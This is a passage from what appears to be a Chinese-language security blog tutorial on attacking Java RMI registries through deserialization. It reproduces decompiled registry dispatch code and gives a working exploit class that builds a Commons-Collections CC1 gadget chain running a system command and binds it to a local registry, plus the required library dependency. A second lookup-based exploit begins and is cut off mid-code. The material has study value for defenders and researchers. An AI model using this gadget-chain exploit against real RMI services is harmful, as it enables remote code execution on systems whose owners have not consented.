+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>String var100;<br>Remote var103;<br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">var105</span> <span class="hljs-operator">=</span> var2.getInputStream();<br>    var100 = (String)var105.readObject();<br>    var103 = (Remote)var105.readObject();<br>&#125; <span class="hljs-keyword">catch</span> (IOException var94) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var94);<br>&#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var95) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var95);<br>&#125; <span class="hljs-keyword">finally</span> &#123;<br>    var2.releaseInputStream();<br>&#125;<br><br>var6.bind(var100, var103);<br><br><span class="hljs-keyword">try</span> &#123;<br>    var2.getResultStream(<span class="hljs-literal">true</span>);<br>    <span class="hljs-keyword">break</span>;<br>&#125; <span class="hljs-keyword">catch</span> (IOException var93) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var93);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><font style="color:#080808;background-color:#ffffff;">case1 – list</font><ul>
+<li><font style="color:#080808;background-color:#ffffff;">list 这里没有 readObject ，无法攻击</font></li>
+</ul>
+</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>var2.releaseInputStream();<br>String[] var99 = var6.list();<br><br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-type">ObjectOutput</span> <span class="hljs-variable">var102</span> <span class="hljs-operator">=</span> var2.getResultStream(<span class="hljs-literal">true</span>);<br>    var102.writeObject(var99);<br>    <span class="hljs-keyword">break</span>;<br>&#125; <span class="hljs-keyword">catch</span> (IOException var92) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var92);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><font style="color:#080808;background-color:#ffffff;">case2 – lookup</font></li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>String var98;<br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">var104</span> <span class="hljs-operator">=</span> var2.getInputStream();<br>    var98 = (String)var104.readObject();<br>&#125; <span class="hljs-keyword">catch</span> (IOException var89) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var89);<br>&#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var90) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var90);<br>&#125; <span class="hljs-keyword">finally</span> &#123;<br>    var2.releaseInputStream();<br>&#125;<br><br><span class="hljs-type">Remote</span> <span class="hljs-variable">var101</span> <span class="hljs-operator">=</span> var6.lookup(var98);<br><br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-type">ObjectOutput</span> <span class="hljs-variable">var9</span> <span class="hljs-operator">=</span> var2.getResultStream(<span class="hljs-literal">true</span>);<br>    var9.writeObject(var101);<br>    <span class="hljs-keyword">break</span>;<br>&#125; <span class="hljs-keyword">catch</span> (IOException var88) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var88);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><font style="color:#080808;background-color:#ffffff;">case3 –  rebind</font></li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>Remote var8;<br>String var97;<br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">var11</span> <span class="hljs-operator">=</span> var2.getInputStream();<br>    var97 = (String)var11.readObject();<br>    var8 = (Remote)var11.readObject();<br>&#125; <span class="hljs-keyword">catch</span> (IOException var85) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var85);<br>&#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var86) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var86);<br>&#125; <span class="hljs-keyword">finally</span> &#123;<br>    var2.releaseInputStream();<br>&#125;<br><br>var6.rebind(var97, var8);<br><br><span class="hljs-keyword">try</span> &#123;<br>    var2.getResultStream(<span class="hljs-literal">true</span>);<br>    <span class="hljs-keyword">break</span>;<br>&#125; <span class="hljs-keyword">catch</span> (IOException var84) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var84);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><font style="color:#080808;background-color:#ffffff;">case4 – unbind</font></li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>String var7;<br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">var10</span> <span class="hljs-operator">=</span> var2.getInputStream();<br>    var7 = (String)var10.readObject();<br>&#125; <span class="hljs-keyword">catch</span> (IOException var81) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var81);<br>&#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var82) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var82);<br>&#125; <span class="hljs-keyword">finally</span> &#123;<br>    var2.releaseInputStream();<br>&#125;<br><br>var6.unbind(var7);<br><br><span class="hljs-keyword">try</span> &#123;<br>    var2.getResultStream(<span class="hljs-literal">true</span>);<br>    <span class="hljs-keyword">break</span>;<br>&#125; <span class="hljs-keyword">catch</span> (IOException var80) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var80);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><font style="color:#080808;background-color:#ffffff;"></font></p>
+<h4 id="4-1-1-bind-rebind"><a href="#4-1-1-bind-rebind" class="headerlink" title="4.1.1 bind&amp;rebind"></a>4.1.1 bind&amp;rebind</h4><p>调用 bind 时，会反序列化参数名和远程对象，如果服务端存在 cc 链</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>String var100;<br>Remote var103;<br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-comment">//首先注册中心接收客户端请求，根据请求的 bind 方法进入 case0 分支，</span><br>    <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">var105</span> <span class="hljs-operator">=</span> var2.getInputStream();<br>    <span class="hljs-comment">//然后进行反序列化</span><br>    <span class="hljs-comment">//第一个对象必须是 String</span><br>    var100 = (String)var105.readObject();<br>    <span class="hljs-comment">//第二个对象被强转为 Remote</span><br>    var103 = (Remote)var105.readObject();<br>&#125; <span class="hljs-keyword">catch</span> (IOException var94) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var94);<br>&#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var95) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var95);<br>&#125; <span class="hljs-keyword">finally</span> &#123;<br>    var2.releaseInputStream();<br>&#125;<br><br>var6.bind(var100, var103);<br><br><span class="hljs-keyword">try</span> &#123;<br>    var2.getResultStream(<span class="hljs-literal">true</span>);<br>    <span class="hljs-keyword">break</span>;<br>&#125; <span class="hljs-keyword">catch</span> (IOException var93) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var93);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<h5 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;  <br><br><span class="hljs-keyword">import</span> java.lang.annotation.Target;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;  <br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;  <br><span class="hljs-keyword">import</span> java.rmi.Remote;  <br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;  <br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;  <br><span class="hljs-keyword">import</span> java.util.HashMap;  <br><span class="hljs-keyword">import</span> java.util.Map;  <br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AttackRegistryEXP</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-number">1099</span>);  <br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) CC1();  <br>        <span class="hljs-comment">//Proxy.newProxyInstance(...)：创建一个动态代理（JDK 动态代理），使之实现 Remote 接口并使用上面得到的 handler 来处理方法调用</span><br>        <span class="hljs-comment">//这一步的作用是把构造的对象包装成 Remote 类型，以便能作为 bind 的第二个参数</span><br>        <span class="hljs-type">Remote</span> <span class="hljs-variable">remote</span> <span class="hljs-operator">=</span> Remote.class.cast(Proxy.newProxyInstance(Remote.class.getClassLoader(),<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; Remote.class &#125;, handler));  <br>        <span class="hljs-comment">//向目标 RMI registry 发送请求，触发反序列化</span><br>        registry.bind(<span class="hljs-string">&quot;sTring&quot;</span>,remote);  <br>    &#125;  <br>    <br><span class="hljs-comment">//下面就是以前分析过的 CC1 链 （TransformedMap 版  ）</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">CC1</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;  <br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),  <br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),  <br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)  <br>        &#125;;  <br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);  <br>        HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();  <br>        hashMap.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>);  <br>        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="hljs-literal">null</span>, chainedTransformer);  <br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);  <br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);  <br>        constructor.setAccessible(<span class="hljs-literal">true</span>);  <br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> constructor.newInstance(Target.class, transformedMap);  <br>        <span class="hljs-keyword">return</span> o;  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p>首先导入 commons-collections 3.2.1</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p><strong>需要注意，服务端和攻击端的项目应一致——都是 maven ，否则攻击无效；如果不在一个项目，都要添加 commons-collections 依赖。</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509250809034.png" srcset="/img/loading.gif" lazyload></p>
+<p>rebind  和 bind 一样，不再赘述。</p>
+<h4 id="4-1-2-lookup-unbind"><a href="#4-1-2-lookup-unbind" class="headerlink" title="4.1.2 lookup&amp;unbind"></a>4.1.2 lookup&amp;unbind</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>String var98;<br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">var104</span> <span class="hljs-operator">=</span> var2.getInputStream();<br>    <span class="hljs-comment">//读取输入流传来的 var98 并反序列化，这里对应的应该是 lookup 参数</span><br>    var98 = (String)var104.readObject();<br>&#125; <span class="hljs-keyword">catch</span> (IOException var89) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var89);<br>&#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var90) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var90);<br>&#125; <span class="hljs-keyword">finally</span> &#123;<br>    var2.releaseInputStream();<br>&#125;<br><br><span class="hljs-comment">//这里调用注册表查找对象，返回 Remote 类型并放在 var101</span><br><span class="hljs-type">Remote</span> <span class="hljs-variable">var101</span> <span class="hljs-operator">=</span> var6.lookup(var98);<br><br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-type">ObjectOutput</span> <span class="hljs-variable">var9</span> <span class="hljs-operator">=</span> var2.getResultStream(<span class="hljs-literal">true</span>);<br>    var9.writeObject(var101);<br>    <span class="hljs-keyword">break</span>;<br>&#125; <span class="hljs-keyword">catch</span> (IOException var88) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var88);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242103446.png" srcset="/img/loading.gif" lazyload></p>
+<p>lookup 只能传入一个 String 类型</p>
+<p>分析 lookup 的功能，然后伪造 lookup 代码，达到目的：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Remote <span class="hljs-title function_">lookup</span><span class="hljs-params">(String var1)</span> <span class="hljs-keyword">throws</span> AccessException, NotBoundException, RemoteException &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//newCll 构造远程调用对象</span><br>            <span class="hljs-type">RemoteCall</span> <span class="hljs-variable">var2</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">super</span>.ref.newCall(<span class="hljs-built_in">this</span>, operations, <span class="hljs-number">2</span>, <span class="hljs-number">4905912898345647071L</span>);<br><br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-comment">//序列化lookup 传入的输入流</span><br>                <span class="hljs-type">ObjectOutput</span> <span class="hljs-variable">var3</span> <span class="hljs-operator">=</span> var2.getOutputStream();<br>                var3.writeObject(var1);<br>            &#125; <span class="hljs-keyword">catch</span> (IOException var18) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling arguments&quot;</span>, var18);<br>            &#125;<br><br>            <span class="hljs-comment">//把上面序列化后的调用真正发往远端、执行远端方法。此处是把 lookup(var1) 请求发送到 RMI 服务器端并等待响应。</span><br>            <span class="hljs-built_in">super</span>.ref.invoke(var2);<br><br>            Remote var23;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">var6</span> <span class="hljs-operator">=</span> var2.getInputStream();<br>                var23 = (Remote)var6.readObject();<br>            &#125; <span class="hljs-keyword">catch</span> (IOException var15) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling return&quot;</span>, var15);<br>            &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var16) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling return&quot;</span>, var16);<br>            &#125; <span class="hljs-keyword">finally</span> &#123;<br>                <span class="hljs-built_in">super</span>.ref.done(var2);<br>            &#125;<br><br>            <span class="hljs-keyword">return</span> var23;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242103011.png" srcset="/img/loading.gif" lazyload></p>
+<p>调用 invoke 后就到了客户端请求注册中心的流程：<img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242103562.png" srcset="/img/loading.gif" lazyload></p>
+<h5 id="EXP：-1"><a href="#EXP：-1" class="headerlink" title="EXP："></a>EXP：</h5><p>在 bind 的基础上修改：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.attack;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><span class="hljs-keyword">import</span> sun.rmi.server.UnicastRef;<br><span class="hljs-keyword">import</span> java.io.ObjectOutput;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><span class="hljs-keyword">import</span> java.rmi.server.Operation;<br><span class="hljs-keyword">import</span> java.rmi.server.RemoteCall;<br><span class="hljs-keyword">import</span> java.rmi.server.RemoteObject;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AttackRegistryEXP02</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span 